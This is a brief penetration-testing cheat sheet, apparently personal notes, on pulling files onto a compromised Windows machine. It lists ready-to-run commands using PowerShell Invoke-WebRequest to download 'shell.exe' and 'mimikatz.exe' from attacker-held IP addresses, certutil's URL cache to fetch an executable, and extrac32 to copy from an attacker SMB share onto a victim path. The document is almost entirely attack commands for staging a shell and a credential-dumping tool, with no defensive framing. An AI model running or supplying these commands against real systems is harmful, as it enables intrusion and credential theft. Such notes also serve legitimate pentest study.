Grabbing file from http server:

```
powershell -c "Invoke-WebRequest" -Uri 'http://10.10.10.10:80/shell.exe' -OutFile 'c:\windows\temp\shell.exe'
```

powershell -c "Invoke-WebRequest" -Uri 'http://10.13.22.125:80/mimikatz.exe' -OutFile 'mimikatz.exe'

---

The command `certutil.exe` can also be used
```
certutil.exe -urlcache -split -f http://web.server/stuff.exe output.exe
```

---

`extrac32.exe` can also be used, but you must stand up an SMB share

```
extrac32 /Y /C \\attack_server\share\test.txt C:\victim\test.txt
```

---


